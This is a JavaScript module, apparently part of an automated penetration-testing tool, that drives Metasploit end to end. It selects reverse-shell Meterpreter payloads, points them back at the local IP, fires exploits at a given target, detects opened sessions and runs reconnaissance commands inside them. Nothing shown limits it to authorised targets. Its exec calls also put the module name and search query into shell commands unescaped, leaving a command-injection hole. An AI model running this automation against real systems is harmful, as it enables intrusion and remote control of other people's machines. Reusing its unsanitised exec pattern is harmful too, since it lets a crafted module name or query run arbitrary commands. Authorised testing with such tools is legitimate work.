const fs = require('fs-extra');
const path = require('path');
const { exec, spawn } = require('child_process');
const { promisify } = require('util');
const toolExecutor = require('../tools/tool-executor.service');
const toolRegistry = require('../tools/tool-registry.service');
const logger = require('../../cli/utils/logger');

const execAsync = promisify(exec);

/**
 * Enhanced Metasploit service for effective exploit execution
 */

/**
 * Get local IP address for reverse shells
 */
function getLocalIP() {
  const os = require('os');
  const interfaces = os.networkInterfaces();
  
  // Prefer non-loopback, IPv4 addresses
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        return iface.address;
      }
    }
  }
  
  // Fallback to localhost
  return '127.0.0.1';
}

/**
 * Determine appropriate payload based on service and OS
 */
function selectPayload(module, service, port, targetOS = 'linux') {
  // Payload selection based on module type and target
  const payloadMap = {
    // Unix/Linux payloads
    'linux': {
      default: 'linux/x86/meterpreter/reverse_tcp',
      shell: 'linux/x86/shell/reverse_tcp',
      bind: 'linux/x86/shell_bind_tcp',
      meterpreter: 'linux/x86/meterpreter/reverse_tcp',
      x64: 'linux/x64/meterpreter/reverse_tcp',
    },
    // Windows payloads
    'windows': {
      default: 'windows/meterpreter/reverse_tcp',
      shell: 'windows/shell/reverse_tcp',
      bind: 'windows/shell_bind_tcp',
      meterpreter: 'windows/meterpreter/reverse_tcp',
      x64: 'windows/x64/meterpreter/reverse_tcp',
    },
  };

  // Detect OS from service/port
  if (service) {
    const serviceLower = service.toLowerCase();
    if (serviceLower.includes('windows') || serviceLower.includes('iis') || serviceLower.includes('ms-wbt-server')) {
      targetOS = 'windows';
    } else if (serviceLower.includes('apache') || serviceLower.includes('ssh') || serviceLower.includes('ftp')) {
      targetOS = 'linux';
    }
  }

  // Module-specific payloads
  if (module.includes('unix') || module.includes('linux')) {
    targetOS = 'linux';
  } else if (module.includes('windows')) {
    targetOS = 'windows';
  }

  const osPayloads = payloadMap[targetOS] || payloadMap['linux'];
  
  // Prefer meterpreter for better functionality
  return osPayloads.meterpreter || osPayloads.default;
}

/**
 * Get module info and required options
 */
async function getModuleInfo(module) {
  try {
    const result = await execAsync(
      `msfconsole -q -x "use ${module}; info; exit" 2>/dev/null`,
      { timeout: 30000 }
    );

    const output = result.stdout || '';
    
    // Extract required options
    const requiredOptions = [];
    const optionalOptions = [];
    
    // Parse module info (basic parsing)
    const optionsMatch = output.match(/Required:\s*([\s\S]*?)(?:Optional:|$)/);
    if (optionsMatch) {
      const requiredSection = optionsMatch[1];
      const optionRegex = /(\w+)\s+yes/g;
      let match;
      while ((match = optionRegex.exec(requiredSection)) !== null) {
        requiredOptions.push(match[1]);
      }
    }

    return {
      module,
      requiredOptions,
      optionalOptions,
      available: true,
      info: output.substring(0, 1000), // Limit info size
    };
  } catch (error) {
    return {
      module,
      requiredOptions: ['RHOSTS'], // Default
      optionalOptions: [],
      available: false,
      error: error.message,
    };
  }
}

/**
 * Build Metasploit resource script with proper options
 */
function buildResourceScript(module, options = {}) {
  const {
    target,
    port,
    payload,
    lhost,
    lport = 4444,
    additionalOptions = {},
    auxiliary = false,
  } = options;

  let script = `use ${module}\n`;

  // Set basic options
  if (target) {
    script += `set RHOSTS ${target}\n`;
  }
  
  if (port) {
    script += `set RPORT ${port}\n`;
  }

  // For exploits, set payload and LHOST
  if (!auxiliary) {
    const selectedPayload = payload || selectPayload(module, options.service, port, options.targetOS);
    script += `set PAYLOAD ${selectedPayload}\n`;
    
    if (selectedPayload.includes('reverse')) {
      script += `set LHOST ${lhost || getLocalIP()}\n`;
      script += `set LPORT ${lport}\n`;
    }
  }

  // Set additional options
  for (const [key, value] of Object.entries(additionalOptions)) {
    if (value !== undefined && value !== null) {
      script += `set ${key.toUpperCase()} ${value}\n`;
    }
  }

  // Run exploit or auxiliary
  if (auxiliary) {
    script += `run\n`;
  } else {
    // Use exploit -j to run in background
    script += `exploit -j\n`;
    // Wait a moment and check sessions
    script += `sleep 3\n`;
    script += `sessions -l\n`;
  }

  script += `exit\n`;

  return script;
}

/**
 * Execute Metasploit exploit with proper configuration
 */
async function executeExploit(module, target, port, options = {}) {
  try {
    logger.step(`Executing Metasploit module: ${module}`);
    
    // Check Metasploit availability
    const msfStatus = await toolRegistry.ensureToolAvailable('msfconsole');
    if (!msfStatus.available) {
      logger.warn('Metasploit not available');
      return { success: false, error: 'Metasploit not installed' };
    }

    // Get module info
    logger.step('Gathering module information...');
    const moduleInfo = await getModuleInfo(module);
    
    if (!moduleInfo.available) {
      logger.warn(`Module ${module} may not be available`);
    }

    // Determine if it's an auxiliary module
    const isAuxiliary = module.startsWith('auxiliary/');
    
    // Build resource script
    const script = buildResourceScript(module, {
      target,
      port,
      service: options.service,
      targetOS: options.targetOS || 'linux',
      payload: options.payload,
      lhost: options.lhost || getLocalIP(),
      lport: options.lport || 4444,
      additionalOptions: options.options || {},
      auxiliary: isAuxiliary,
    });

    // Save script
    const scriptPath = path.join(process.env.WORK_DIR || './work', `msf_${Date.now()}.rc`);
    await fs.ensureDir(path.dirname(scriptPath));
    await fs.writeFile(scriptPath, script, 'utf8');

    logger.tool('msfconsole', `Running ${module}`, `against ${target}:${port}`);
    logger.info(`Resource script: ${scriptPath}`);
    
    // Show script preview (first few lines)
    const scriptPreview = script.split('\n').slice(0, 8).join('\n');
    logger.info(`Script preview:\n${scriptPreview}...`);

    // Execute with proper timeout
    const timeout = isAuxiliary ? 60000 : 300000; // 1 min for aux, 5 min for exploits
    
    const result = await toolExecutor.executeTool('msfconsole', ['-r', scriptPath], {
      timeout,
    });

    const output = result.output || result.stdout || '';
    
    // Parse session information
    const sessionInfo = parseSessionInfo(output);
    
    // Check for success
    const success = sessionInfo.sessions.length > 0 || 
                   output.includes('Meterpreter session') ||
                   output.includes('Command shell session') ||
                   output.includes('Session opened') ||
                   (!isAuxiliary && (output.includes('session 1 opened') || output.includes('session opened')));

    if (success) {
      logger.success(`🎯 Metasploit ${isAuxiliary ? 'auxiliary' : 'exploit'} successful!`);
      
      if (sessionInfo.sessions.length > 0) {
        logger.info(`Session(s) opened: ${sessionInfo.sessions.map(s => `#${s.id}`).join(', ')}`);
      }
      
      return {
        success: true,
        output,
        module,
        method: 'metasploit',
        session: sessionInfo.sessions[0]?.id || 'active',
        sessions: sessionInfo.sessions,
        sessionInfo,
        scriptPath,
      };
    }

    // Check for common errors
    const errorInfo = parseErrors(output);
    
    return {
      success: false,
      output,
      error: errorInfo.error || 'Exploit executed but no session opened',
      details: errorInfo.details,
      scriptPath,
    };
  } catch (error) {
    logger.error(`Error executing Metasploit exploit: ${error.message}`);
    return {
      success: false,
      error: error.message,
    };
  }
}

/**
 * Parse session information from Metasploit output
 */
function parseSessionInfo(output) {
  const sessions = [];
  
  // Pattern 1: "Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.11:xxxxx)"
  const meterpreterRegex = /(?:Meterpreter|Command shell|Shell) session (\d+) opened \(([^)]+)\)/gi;
  let match;
  while ((match = meterpreterRegex.exec(output)) !== null) {
    sessions.push({
      id: parseInt(match[1]),
      type: 'meterpreter',
      connection: match[2],
    });
  }
  
  // Pattern 2: From sessions list
  // Format: "1   meterpreter x86/linux  192.168.1.11:xxxxx -> 192.168.1.100:4444"
  const listRegex = /(\d+)\s+(meterpreter|shell)\s+([^\s]+)\s+([^\s]+)\s+->\s+([^\s]+)/gi;
  while ((match = listRegex.exec(output)) !== null) {
    const sessionId = parseInt(match[1]);
    // Avoid duplicates
    if (!sessions.find(s => s.id === sessionId)) {
      sessions.push({
        id: sessionId,
        type: match[2],
        arch: match[3],
        target: match[4],
        local: match[5],
      });
    }
  }
  
  // Pattern 3: Simple "session 1 opened"
  const simpleRegex = /session (\d+) opened/gi;
  while ((match = simpleRegex.exec(output)) !== null) {
    const sessionId = parseInt(match[1]);
    if (!sessions.find(s => s.id === sessionId)) {
      sessions.push({
        id: sessionId,
        type: 'unknown',
      });
    }
  }

  return { sessions };
}

/**
 * Parse errors from Metasploit output
 */
function parseErrors(output) {
  const errorPatterns = [
    { pattern: /exploit completed, but no session/i, error: 'Exploit completed but no session created' },
    { pattern: /connection refused/i, error: 'Connection refused - target may be down or filtering' },
    { pattern: /authentication failed/i, error: 'Authentication failed - wrong credentials' },
    { pattern: /target is not vulnerable/i, error: 'Target is not vulnerable to this exploit' },
    { pattern: /target is not compatible/i, error: 'Target architecture/OS not compatible' },
    { pattern: /timeout/i, error: 'Connection timeout' },
    { pattern: /failed to connect/i, error: 'Failed to connect to target' },
    { pattern: /payload generation failed/i, error: 'Payload generation failed' },
  ];

  for (const { pattern, error } of errorPatterns) {
    if (pattern.test(output)) {
      return { error, details: output.match(pattern)?.[0] };
    }
  }

  return { error: null, details: null };
}

/**
 * List active sessions
 */
async function listSessions() {
  try {
    const script = `sessions -l\nexit\n`;
    const scriptPath = path.join(process.env.WORK_DIR || './work', `msf_list_${Date.now()}.rc`);
    await fs.writeFile(scriptPath, script);
    
    const result = await toolExecutor.executeTool('msfconsole', ['-r', scriptPath], {
      timeout: 30000,
    });
    
    const output = result.output || result.stdout || '';
    const sessionInfo = parseSessionInfo(output);
    
    return {
      success: true,
      sessions: sessionInfo.sessions,
      output,
    };
  } catch (error) {
    return {
      success: false,
      error: error.message,
      sessions: [],
    };
  }
}

/**
 * Interact with a session
 */
async function interactWithSession(sessionId) {
  try {
    logger.info(`Interacting with session ${sessionId}...`);
    logger.warn('To interact manually, run: msfconsole -> sessions -i ' + sessionId);
    
    // Get session info
    const script = `sessions -i ${sessionId}\nwhoami\npwd\nsysinfo\nexit\n`;
    const scriptPath = path.join(process.env.WORK_DIR || './work', `msf_interact_${Date.now()}.rc`);
    await fs.writeFile(scriptPath, script);
    
    const result = await toolExecutor.executeTool('msfconsole', ['-r', scriptPath], {
      timeout: 30000,
    });
    
    return {
      success: true,
      output: result.output || result.stdout || '',
    };
  } catch (error) {
    return {
      success: false,
      error: error.message,
    };
  }
}

/**
 * Search for Metasploit modules
 */
async function searchModules(query) {
  try {
    const result = await execAsync(
      `msfconsole -q -x "search ${query}; exit" 2>/dev/null`,
      { timeout: 30000 }
    );

    const output = result.stdout || '';
    const modules = [];
    
    // Parse search results
    // Format: "exploit/linux/...  2011-01-01       excellent  Yes    vsftpd 2.3.4..."
    const lines = output.split('\n');
    let inResults = false;
    
    for (const line of lines) {
      if (line.includes('Name') && line.includes('Disclosure')) {
        inResults = true;
        continue;
      }
      
      if (inResults && line.trim() && !line.includes('=')) {
        const parts = line.trim().split(/\s{2,}/);
        if (parts.length >= 3) {
          modules.push({
            name: parts[0]?.trim(),
            disclosure: parts[1]?.trim(),
            rank: parts[2]?.trim(),
            payload: parts[3]?.trim() === 'Yes',
            description: parts.slice(4).join(' ').trim(),
          });
        }
      }
    }
    
    return {
      success: true,
      modules,
      count: modules.length,
    };
  } catch (error) {
    return {
      success: false,
      error: error.message,
      modules: [],
    };
  }
}

module.exports = {
  executeExploit,
  getModuleInfo,
  selectPayload,
  listSessions,
  interactWithSession,
  searchModules,
  buildResourceScript,
  getLocalIP,
  parseSessionInfo,
};

